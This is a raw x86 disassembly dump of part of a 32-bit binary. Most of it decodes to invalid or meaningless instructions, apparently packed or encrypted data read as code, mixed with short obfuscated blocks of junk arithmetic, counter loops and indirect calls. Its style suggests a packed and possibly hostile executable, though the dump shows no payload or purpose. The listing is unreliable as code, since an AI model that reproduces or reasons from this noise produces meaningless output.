  40b6b4:	retf   0x8a1a
  40b6b7:	imul   esi,DWORD PTR [esi-0x49],0x46113227
  40b6be:	and    DWORD PTR [edx],0x77312ac0
  40b6c4:	pop    ecx
  40b6c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6c6:	jns    0x40b6d3
  40b6c8:	cs xchg esp,eax
  40b6ca:	jmp    0x40b6ec
  40b6cc:	jo     0x40b6f0
  40b6ce:	jmp    0x40b6fb
  40b6d0:	mov    ds:0xca48502d,eax
  40b6d5:	push   edi
  40b6d6:	aad    0xf2
  40b6d8:	sbb    eax,0x45531442
  40b6dd:	pop    ebp
  40b6de:	pop    bp
  40b6e0:	clc    
  40b6e1:	dec    ebx
  40b6e2:	cmp    dh,BYTE PTR [eax-0x59]
  40b6e5:	call   0x4ceb:0xdd0eec27
  40b6ec:	mov    eax,0xc568769e
  40b6f1:	mov    ebx,DWORD PTR [ecx+0x2c]
  40b6f4:	mov    ebx,DWORD PTR [ecx*4+0x1c354c3a]
  40b6fb:	xchg   cl,bl
  40b6fd:	xchg   esp,ecx
  40b6ff:	ror    DWORD PTR [ebp-0x4eece5a5],1
  40b705:	hlt    
  40b706:	aad    0x1
  40b708:	jns    0x40b747
  40b70a:	push   ebx
  40b70b:	xor    al,0x24
  40b70d:	stos   DWORD PTR es:[edi],eax
  40b70e:	xchg   ecx,eax
  40b70f:	sbb    DWORD PTR [ecx+0x31],esp
  40b712:	or     eax,DWORD PTR [ebx+0x6c17eb08]
  40b718:	xchg   BYTE PTR [edi-0x4],al
  40b71b:	(bad)  [edx]
  40b71d:	mov    eax,ds:0x4c539d8b
  40b722:	add    ch,ah
  40b724:	popa   
  40b725:	pop    ebx
  40b726:	cmp    edi,ebx
  40b728:	xor    cl,ch
  40b72a:	test   al,0x91
  40b72c:	xchg   ebp,eax
  40b72d:	sahf   
  40b72e:	inc    ebp
  40b72f:	out    dx,al
  40b730:	mov    edx,cs
  40b732:	add    eax,0xfffffff0
  40b735:	bndldx bnd2,[ecx+0x43df82f9]
  40b73c:	cli    
  40b73d:	mov    esp,0x1bc52d09
  40b742:	arpl   WORD PTR [ebp+0x674f15be],cx
  40b748:	scas   al,BYTE PTR es:[edi]
  40b749:	addr16 inc esp
  40b74b:	aam    0x7c
  40b74d:	sub    eax,0xae0f6ac8
  40b752:	dec    edx
  40b753:	mov    esi,0x57632e28
  40b758:	clc    
  40b759:	mov    esi,0x4b051945
  40b75e:	shr    BYTE PTR [edi],1
  40b760:	ins    DWORD PTR es:[edi],dx
  40b761:	ins    BYTE PTR es:[edi],dx
  40b762:	test   al,0x16
  40b764:	call   FWORD PTR [ebp-0x1ced11fe]
  40b76a:	cld    
  40b76b:	xor    DWORD PTR [ebp-0x652c438e],esi
  40b771:	mov    bh,0x24
  40b773:	mov    ch,0x96
  40b775:	cmp    ebp,DWORD PTR [ecx+0x79]
  40b778:	dec    esp
  40b779:	or     edi,DWORD PTR [bx+0x7c]
  40b77d:	ret    
  40b77e:	lock cmp al,0x58
  40b781:	push   ebp
  40b782:	(bad)  
  40b783:	mov    edx,0x254cf68c
  40b788:	and    BYTE PTR [ecx-0x77],ah
  40b78b:	jne    0x40b765
  40b78d:	and    DWORD PTR ds:0x4305b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430642
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xd1514597
  40b7b0:	jmp    0x7ebf9e32
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b824
  40b7ba:	add    bl,BYTE PTR [ebx+esi*4+0x6a]
  40b7be:	shl    BYTE PTR [edx+0x38],cl
  40b7c1:	lock std 
  40b7c3:	cli    
  40b7c4:	outs   dx,DWORD PTR ds:[esi]
  40b7c5:	push   ss
  40b7c6:	fistp  WORD PTR [eax+eiz*2]
  40b7c9:	xchg   ebx,eax
  40b7ca:	xchg   esp,eax
  40b7cb:	fisttp QWORD PTR [edx-0x12]
  40b7ce:	shl    DWORD PTR [eax-0x2a],cl
  40b7d1:	ret    
  40b7d2:	clc    
  40b7d3:	add    BYTE PTR ds:0x4b18da82,0x3
  40b7da:	(bad)  
  40b7db:	aam    0x9a
  40b7dd:	or     dl,bh
  40b7df:	cmp    al,0x73
  40b7e1:	imul   eax,DWORD PTR [edi+eax*1-0x7d],0x10
  40b7e6:	jns    0x40b7b9
  40b7e8:	addr16 out dx,al
  40b7ea:	pusha  
  40b7eb:	xchg   esp,eax
  40b7ec:	rcl    DWORD PTR [esp+edx*2-0x7d75f8eb],0x4
  40b7f4:	push   edx
  40b7f5:	push   0x93057e4a
  40b7fa:	jle    0x40b7a7
  40b7fc:	test   DWORD PTR [edx+0x3f],edi
  40b7ff:	lds    esi,FWORD PTR es:[ecx-0x2e1a76d1]
  40b806:	cli    
  40b807:	or     al,0x98
  40b809:	cli    
  40b80a:	and    BYTE PTR [edi+0x7a],dh
  40b80d:	imul   DWORD PTR [edx]
  40b80f:	ret    
  40b810:	test   ecx,esp
  40b812:	sub    BYTE PTR [ecx-0x20596ebf],cl
  40b818:	enter  0xe193,0x85
  40b81c:	mov    cl,0x0
  40b81e:	test   al,0x95
  40b820:	and    esi,0xe
  40b823:	mov    dh,ch
  40b825:	leave  
  40b826:	sub    BYTE PTR [ecx+0x64209ef2],dh
  40b82c:	xchg   cl,bl
  40b82e:	scas   eax,DWORD PTR es:[edi]
  40b82f:	js     0x40b828
  40b831:	mov    bh,0x17
  40b833:	pusha  
  40b834:	adc    dl,cl
  40b836:	mov    edi,0x4004a703
  40b83b:	inc    esp
  40b83c:	and    DWORD PTR [ecx-0x417fcf77],ebp
  40b842:	jae    0x40b7d2
  40b844:	dec    edx
  40b845:	js     0x40b8ad
  40b847:	test   DWORD PTR [ebp-0x3c522d47],ecx
  40b84d:	mov    esi,0xd54a0c90
  40b852:	ret    
  40b853:	mov    ss,WORD PTR [edx]
  40b855:	and    eax,0x1e4bc685
  40b85a:	add    cl,ch
  40b85c:	add    ch,al
  40b85e:	push   edi
  40b85f:	inc    edi
  40b860:	data16 jno 0x40b836
  40b863:	lea    esp,[eax-0x72c09f37]
  40b869:	clc    
  40b86a:	sub    eax,0xc89a5ccb
  40b86f:	mov    al,ds:0xca53982f
  40b874:	repz mov ebx,DWORD PTR [ebx-0x20]
  40b878:	or     al,0xb5
  40b87a:	sub    cl,BYTE PTR [eax-0x1d]
  40b87d:	loope  0x40b8e4
  40b87f:	mov    dh,0x74
  40b881:	push   ds
  40b882:	or     BYTE PTR [ebp-0x71952fa4],bh
  40b888:	std    
  40b889:	rcl    DWORD PTR [edx],0xaf
  40b88c:	arpl   WORD PTR [ebx-0x60],bp
  40b88f:	and    eax,0x8f4530d8
  40b894:	mov    dh,BYTE PTR [eax+0x3d]
  40b897:	fs into 
  40b899:	ret    
  40b89a:	push   ss
  40b89b:	adc    ebx,ebx
  40b89d:	scas   al,BYTE PTR es:[edi]
  40b89e:	imul   DWORD PTR [ecx]
  40b8a0:	pop    ebp
  40b8a1:	adc    edi,esp
  40b8a3:	inc    edx
  40b8a4:	jb     0x40b8ce
  40b8a6:	adc    al,0x5a
  40b8a8:	pop    ss
  40b8a9:	sub    DWORD PTR [ebp+0x743ce7d4],0xffffffd2
  40b8b0:	jmp    0xbb2:0xa4787a6a
  40b8b7:	das    
  40b8b8:	push   0x776c306b
  40b8bd:	sbb    eax,0xb2ba0fb3
  40b8c2:	cdq    
  40b8c3:	jo     0x40b864
  40b8c5:	dec    esp
  40b8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8c7:	jp     0x40b919
  40b8c9:	xor    BYTE PTR [esi+eax*2-0x596e01af],bl
  40b8d0:	mov    bh,BYTE PTR [esi-0x2c]
  40b8d3:	push   eax
  40b8d4:	scas   al,BYTE PTR es:[edi]
  40b8d5:	loopne 0x40b875
  40b8d7:	in     al,dx
  40b8d8:	xchg   esi,eax
  40b8d9:	std    
  40b8da:	fld    QWORD PTR [ecx-0x5b7ab05a]
  40b8e0:	xchg   edi,eax
  40b8e1:	stos   DWORD PTR es:[edi],eax
  40b8e2:	push   ss
  40b8e3:	shl    edx,0xbe
  40b8e6:	(bad)  
  40b8e7:	jg     0x40b94e
  40b8e9:	(bad)  
  40b8ea:	fstp   DWORD PTR fs:[ecx-0x62]
  40b8ee:	sahf   
  40b8ef:	add    eax,0x701d1c00
  40b8f4:	push   esp
  40b8f5:	xchg   ebp,eax
  40b8f6:	mov    bl,0x37
  40b8f8:	mov    edx,0xec758979
  40b8fd:	sbb    ecx,DWORD PTR ds:0x430646
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430596
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43059e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4305a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ef28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ef2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ef20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	xor    BYTE PTR [edi-0x61],0x60
  40b963:	sbb    DWORD PTR [esi],edi
  40b965:	clc    
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b968
  40b96d:	ds loopne 0x40b8f8
  40b970:	jae    0x40b926
  40b972:	shl    DWORD PTR [esi],0x82
  40b975:	xchg   edi,eax
  40b976:	(bad)  
  40b977:	and    al,BYTE PTR cs:[edi-0x239e4fa5]
  40b97e:	loope  0x40b975
  40b980:	fiadd  DWORD PTR [ebx+0x7984d875]
  40b986:	push   edi
  40b987:	ja     0x40b94a
  40b989:	cmp    BYTE PTR [ebx+0x313b2a8e],dl
  40b98f:	mov    al,ds:0xcc1ae672
  40b994:	into   
  40b995:	sbb    eax,0x8c86cedb
  40b99a:	add    BYTE PTR [ecx+0x6227aa0],0x6
  40b9a1:	sub    bl,ah
  40b9a3:	repz sub esi,DWORD PTR cs:[ebp+0x3d]
  40b9a8:	dec    ebx
  40b9a9:	aas    
  40b9aa:	inc    edi
  40b9ab:	fistp  QWORD PTR [eax]
  40b9ad:	gs jecxz 0x40b953
  40b9b0:	inc    edx
  40b9b1:	sub    DWORD PTR [ecx-0x3a],0xffffff96
  40b9b5:	add    eax,0x6e60456
  40b9ba:	ins    DWORD PTR es:[edi],dx
  40b9bb:	cmc    
  40b9bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9bd:	in     eax,0xb8
  40b9bf:	add    ch,0x12
  40b9c2:	dec    esi
  40b9c3:	clc    
  40b9c4:	push   cs
  40b9c5:	jns    0x40b94f
  40b9c7:	sar    DWORD PTR [ebp+0x307e0140],cl
  40b9cd:	mov    ah,0x7e
  40b9cf:	(bad)  
  40b9d1:	bound  esi,QWORD PTR [ecx+0x4a]
  40b9d4:	arpl   di,bx
  40b9d6:	mov    bl,BYTE PTR [edx]
  40b9d8:	pop    ecx
  40b9d9:	ret    0xabe8
  40b9dc:	rcr    BYTE PTR [eax-0x4b],1
  40b9df:	les    edi,FWORD PTR [ebx]
  40b9e1:	mov    ebx,0x414c7ba8
  40b9e6:	cwde   
  40b9e7:	cmp    BYTE PTR [esi+0xb27bf1d],bl
  40b9ed:	pop    ebp
  40b9ee:	int    0x7c
  40b9f0:	xchg   esi,eax
  40b9f1:	add    BYTE PTR [esi],bl
  40b9f3:	cwde   
  40b9f4:	dec    ecx
  40b9f5:	mov    dl,BYTE PTR [eax+0x12]
  40b9f8:	sub    edi,DWORD PTR [ebx]
  40b9fa:	push   ds
  40b9fb:	aad    0xbd
  40b9fd:	pop    ss
  40b9fe:	fwait
  40b9ff:	ret    0xa5cc
  40ba02:	dec    esp
  40ba03:	or     BYTE PTR ds:[esi+0x65],cl
  40ba07:	add    DWORD PTR [ecx],esp
  40ba09:	mov    dh,0x82
  40ba0b:	imul   ecx,DWORD PTR [edx],0x39
  40ba0e:	mov    ebx,0x37735833
  40ba13:	or     eax,0x87a0a577
  40ba18:	mov    al,ds:0x4ca68e79
  40ba1d:	xor    cl,ch
  40ba1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba20:	mov    ebx,0xd379355e
  40ba25:	push   esi
  40ba26:	ret    0xb34b
  40ba29:	fst    QWORD PTR [ecx-0x636cf964]
  40ba2f:	mov    BYTE PTR [esi],bl
  40ba31:	(bad)  
  40ba32:	fsubr  st(4),st
  40ba34:	inc    ebx
  40ba35:	int    0x83
  40ba37:	pop    esp
  40ba38:	mov    cl,0x84
  40ba3a:	mov    edi,0xeedf995a
  40ba3f:	loope  0x40ba2e
  40ba41:	push   es
  40ba42:	jno    0x40b9f2
  40ba44:	test   ah,dl
  40ba46:	add    al,0x1b
  40ba48:	mov    ebp,0xf92ff8a2
  40ba4d:	xor    BYTE PTR [esi+0x470f49e6],dh
  40ba53:	lds    edi,FWORD PTR [esi]
  40ba55:	clc    
  40ba56:	add    DWORD PTR [ebx-0x18772987],eax
  40ba5c:	sbb    DWORD PTR [edi+eax*8+0x7fc96f15],esp
  40ba63:	or     DWORD PTR [edx+0x6a6d7dfc],edx
  40ba69:	push   0xffffffee
  40ba6b:	xor    al,0xe4
  40ba6d:	xor    cl,0x25
  40ba70:	mov    ebx,DWORD PTR [edx]
  40ba72:	jle    0x40ba68
  40ba74:	jmp    0x4813f663
  40ba79:	or     al,0x90
  40ba7b:	popa   
  40ba7c:	les    eax,FWORD PTR [ebx-0x11555ec9]
  40ba82:	sbb    ah,BYTE PTR [ebx-0x73]
  40ba85:	jno    0x40ba12
  40ba87:	cmp    BYTE PTR [edi],0xb2
  40ba8a:	cmp    al,0x66
  40ba8c:	xchg   edx,eax
  40ba8d:	pop    ds
  40ba8e:	adc    eax,0xa336c6f1
  40ba93:	inc    eax
  40ba94:	rol    BYTE PTR [edi],0xc8
  40ba97:	adc    ecx,DWORD PTR [eax-0x5b5e8772]
  40ba9d:	xor    DWORD PTR [ebx+0xe82f7bb],ebx
  40baa3:	daa    
  40baa4:	push   0x1
  40baa6:	and    ah,BYTE PTR [ecx]
  40baa8:	add    DWORD PTR [eax],eax
  40baaa:	dec    edi
  40baab:	push   edi
  40baac:	icebp  
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42ef20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430596,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ef28,0x42ef14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ef1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ef1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ef1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ef1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ecd4
  40bb1b:	cmp    DWORD PTR ds:0x42ef1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430656
  40bb2e:	xor    DWORD PTR ds:0x4305b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4305b2,0x43059a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	push   esp
  40bb57:	cld    
  40bb58:	xor    ah,BYTE PTR [esi+0x7e7ef9ff]
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb90
  40bb63:	xchg   edi,edi
  40bb65:	(bad)  
  40bb66:	inc    ebp
  40bb67:	mov    ?,eax
  40bb69:	adc    DWORD PTR [edx*8-0x48220c70],ebx
  40bb70:	or     DWORD PTR [ebp-0x1f0f9004],0x230dec3d
  40bb7a:	cmp    al,0x4c
  40bb7c:	sub    BYTE PTR [esi],0x3f
  40bb7f:	cwde   
  40bb80:	je     0x40bbf8
  40bb82:	cmp    BYTE PTR [edx],bh
  40bb84:	inc    eax
  40bb85:	or     cl,BYTE PTR [esi]
  40bb87:	mov    edx,0xe7df0f74
  40bb8c:	fidiv  WORD PTR [ebp+ebp*1+0x56227839]
  40bb93:	lods   al,BYTE PTR ds:[esi]
  40bb94:	sbb    esp,DWORD PTR [esi]
  40bb96:	mov    eax,ds:0xb80bcf97
  40bb9b:	xchg   ebp,eax
  40bb9c:	mov    ds:0x880649ba,al
  40bba1:	nop
  40bba2:	clc    
  40bba3:	sub    eax,0x8a6a616d
  40bba8:	test   DWORD PTR [esi+0x75339121],0xc4edf1b9
  40bbb2:	call   0x71a3b337
  40bbb7:	push   esi
  40bbb8:	xor    BYTE PTR [ebx],0x84
  40bbbb:	pop    esp
  40bbbc:	or     al,0x4f
  40bbbe:	(bad)  
  40bbbf:	je     0x40bbf6
  40bbc1:	sub    ch,BYTE PTR [edi]
  40bbc3:	js     0x40bc0d
  40bbc5:	leave  
  40bbc6:	(bad)  [ebx]
  40bbc8:	adc    DWORD PTR ds:0x4ae68d94,ebp
  40bbce:	sub    DWORD PTR [ebx-0x44fd2361],esp
  40bbd4:	ins    BYTE PTR es:[edi],dx
  40bbd5:	sbb    edi,DWORD PTR [ecx-0x59]
  40bbd8:	pop    ecx
  40bbd9:	jp     0x40bc0e
  40bbdb:	repnz mov ds:0xf49af0b2,al
  40bbe1:	jae    0x40bbdf
  40bbe3:	and    BYTE PTR [ecx+0x1b],0x8a
  40bbe7:	mov    eax,0x36f83170
  40bbec:	aad    0x1e
  40bbee:	lods   al,BYTE PTR ds:[esi]
  40bbef:	fs gs push edx
  40bbf2:	push   es
  40bbf3:	add    al,0xd
  40bbf5:	sub    DWORD PTR [edx],eax
  40bbf7:	out    dx,eax
  40bbf8:	sbb    esp,DWORD PTR [edx+0x285e78a0]
  40bbfe:	sub    esi,ecx
  40bc00:	test   bh,dl
  40bc02:	ins    DWORD PTR es:[edi],dx
  40bc03:	mov    ch,0xa1
  40bc05:	jmp    0x40bb8b
  40bc07:	jl     0x40bb8c
  40bc09:	add    BYTE PTR [ebx+0x32586e80],bh
  40bc0f:	dec    ebp
  40bc10:	sbb    edi,DWORD PTR [esi-0x39]
  40bc13:	inc    edx
  40bc14:	mov    dl,BYTE PTR [ebp+0x19]
  40bc17:	(bad)  
  40bc18:	cwde   
  40bc19:	stos   DWORD PTR es:[edi],eax
  40bc1a:	jae    0x40bc68
  40bc1c:	lock xor DWORD PTR [esi-0x3d],eax
  40bc20:	jl     0x40bc11
  40bc22:	lods   al,BYTE PTR ds:[esi]
  40bc23:	adc    edi,DWORD PTR [edi]
  40bc25:	mov    bl,0x24
  40bc27:	in     al,dx
  40bc28:	mov    edi,0x76db97b6
  40bc2d:	jae    0x40bc7b
  40bc2f:	(bad)  
  40bc30:	mov    edx,0xed15c416
  40bc35:	inc    esp
  40bc36:	inc    ecx
  40bc37:	sbb    eax,0x820a2600
  40bc3c:	xchg   DWORD PTR [edx+ebx*8-0x1c0816e8],esp
  40bc43:	mov    ecx,0xcd286af6
  40bc48:	loop   0x40bbeb
  40bc4a:	xchg   ebp,eax
  40bc4b:	pop    edi
  40bc4c:	adc    DWORD PTR [eax],esi
  40bc4e:	out    dx,al
  40bc4f:	jle    0x40bc22
  40bc51:	cwde   
  40bc52:	in     al,0x54
  40bc54:	mov    DWORD PTR ds:0xdc62cd7d,esi
  40bc5a:	lock sbb eax,0xb7f5152f
  40bc60:	call   0xcf8d:0xe11d5626
  40bc67:	push   esi
  40bc68:	cli    
  40bc69:	sub    esp,DWORD PTR [eax]
  40bc6b:	xchg   DWORD PTR [ecx+0x2b339f91],edx
  40bc71:	cmc    
  40bc72:	jnp    0x40bcae
  40bc74:	mov    fs,esp
  40bc76:	mov    bh,0x74
  40bc78:	push   edi
  40bc79:	into   
  40bc7a:	int    0xe8
  40bc7c:	dec    ebx
  40bc7d:	add    bh,BYTE PTR [eax-0x39463747]
  40bc83:	test   DWORD PTR [ebp-0x15],edi
  40bc86:	xchg   bp,ax
  40bc88:	sahf   
  40bc89:	sti    
  40bc8a:	adc    DWORD PTR [edi+0xb377e2a],0x9868771f
  40bc94:	jp     0x40bcf7
  40bc96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc97:	sar    BYTE PTR [ebp+0xd],0xb2
  40bc9b:	pop    edi
  40bc9c:	pop    ebp
  40bc9d:	jo     0x40bc99
  40bc9f:	xor    eax,0x32539fc
  40bca4:	ret    
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430652,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43064e,0x42ef30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4305be,0x430646
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4305c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4305c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4305c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4305c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4305c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4305a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42eb2c
  40bd1f:	cmp    DWORD PTR ds:0x4305c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4305c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4305c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e872,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430596
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43065a,0x430652
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ef10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4305b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4305b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4305b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42eb30
  40bdad:	mov    ecx,DWORD PTR ds:0x4305b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4305b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43065a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	push   ecx
  40bddd:	pusha  
  40bdde:	adc    edi,eax
  40bde0:	mov    al,0xfa
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40be58
  40bde9:	xchg   bh,ch
  40bdeb:	jp     0x40be55
  40bded:	jns    0x40bdb7
  40bdef:	lods   eax,DWORD PTR ds:[esi]
  40bdf0:	xor    eax,0x723b63bb
  40bdf5:	sbb    eax,0xdb8ab047
  40bdfa:	gs mov bh,0xcf
  40bdfd:	pop    ebx
  40bdfe:	(bad)  
  40bdff:	shl    BYTE PTR [ebx-0x53b0f9ba],1
  40be05:	mov    esp,0xc901a5dc
  40be0a:	out    0x43,eax
  40be0c:	pop    ss
  40be0d:	sti    
  40be0e:	fidivr DWORD PTR [edi+0x600c13c9]
  40be14:	xchg   DWORD PTR [edx-0x101055bf],esp
  40be1a:	les    esi,FWORD PTR [edx]
  40be1c:	cmc    
  40be1d:	ss and al,0x77
  40be20:	push   ds
  40be21:	out    dx,al
  40be22:	out    dx,al
  40be23:	lock cwd 
  40be26:	pop    eax
  40be27:	jns    0x40be6c
  40be29:	jmp    0x9716:0xd46c33b
  40be30:	hlt    
  40be31:	xor    eax,0x2d5b0a0a
  40be36:	or     ecx,DWORD PTR [ebx-0x285071d2]
  40be3c:	loop   0x40be1d
  40be3e:	sub    al,0xff
  40be40:	ss je  0x40be80
  40be43:	pop    ds
  40be44:	adc    ch,BYTE PTR [eax+edi*8-0xba35720]
  40be4b:	inc    edx
  40be4c:	and    eax,0x9028ad8a
  40be51:	ret    0x9647
  40be54:	in     al,0xe1
  40be56:	inc    ebp
  40be57:	dec    eax
  40be58:	lods   eax,DWORD PTR ds:[esi]
  40be59:	dec    ebp
  40be5a:	call   0xc1d6fd00
  40be5f:	add    eax,0xc93e7d29
  40be64:	scas   al,BYTE PTR es:[di]
  40be66:	outs   dx,WORD PTR ds:[esi]
  40be68:	mov    dl,0xb2
  40be6a:	mov    dl,0xa5
  40be6c:	out    0x60,al
  40be6e:	and    eax,0x5e18e050
  40be73:	mov    ebp,0x815537a5
  40be78:	pop    ecx
  40be79:	es and eax,0x76f895fe
  40be7f:	jae    0x40be3d
  40be81:	adc    eax,0x2b28ffdf
  40be86:	rcr    esp,cl
  40be88:	hlt    
  40be89:	and    esi,DWORD PTR [ecx]
  40be8b:	popa   
  40be8c:	xchg   edi,eax
  40be8d:	out    0x3,al
  40be8f:	jmp    0x40be4d
  40be91:	add    DWORD PTR [ebx+ebp*4-0x7b90ea01],eax
  40be98:	daa    
  40be99:	sub    DWORD PTR [edi-0x725abbbb],eax
  40be9f:	loopne 0x40bea4
  40bea1:	stos   BYTE PTR es:[edi],al
  40bea2:	iret   
  40bea3:	xchg   ecx,eax
  40bea4:	dec    edi
  40bea5:	mov    ds:0x44d269f4,eax
  40beaa:	ins    BYTE PTR es:[edi],dx
  40beab:	cmp    ch,ch
  40bead:	imul   dh
  40beaf:	jecxz  0x40be9e
  40beb1:	and    eax,0x97f3425e
  40beb6:	add    DWORD PTR [eax-0x26eedfd7],ecx
  40bebc:	lock push ebx
  40bebe:	xchg   dh,dl
  40bec0:	call   0x75c6:0x2f50c9ef
  40bec7:	out    dx,al
  40bec8:	sub    dl,BYTE PTR [esp+eiz*8]
  40becb:	cli    
  40becc:	mov    DWORD PTR gs:[ebp-0x13],ecx
  40bed0:	test   ecx,esi
  40bed2:	mov    ebp,0xc9346549
  40bed7:	scas   eax,DWORD PTR es:[edi]
  40bed8:	and    ebx,DWORD PTR [ebx-0x1a1942aa]
  40bede:	adc    BYTE PTR [ebx-0x24],bh
  40bee1:	retf   
  40bee2:	pop    ss
  40bee3:	inc    ecx
  40bee4:	and    eax,0xacd28b58
  40bee9:	fsubp  st(3),st
  40beeb:	dec    edx
  40beec:	add    esp,DWORD PTR es:[ebx]
  40beef:	repnz push cs
  40bef1:	hlt    
  40bef2:	adc    DWORD PTR [edi-0x1b9d34c8],ecx
  40bef8:	adc    eax,0xd76a576b
  40befd:	bound  esi,QWORD PTR [ebp-0x6a]
  40bf00:	enter  0xfbd7,0x22
  40bf04:	shl    DWORD PTR [ebx],0x5f
  40bf07:	or     eax,0xa6afad6c
  40bf0c:	jo     0x40bf85
  40bf0e:	inc    edx
  40bf0f:	inc    eax
  40bf10:	hlt    
  40bf11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf12:	sbb    DWORD PTR [ebx],ebp
  40bf14:	jmp    0xa60ed5e
  40bf19:	sahf   
  40bf1a:	je     0x40bf2b
  40bf1c:	stos   BYTE PTR es:[edi],al
  40bf1d:	add    BYTE PTR [ebp-0x4d72c0d3],cl
  40bf23:	pop    edi
  40bf24:	test   BYTE PTR [eax-0x74cc9f3f],0x45
  40bf2b:	in     al,dx
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
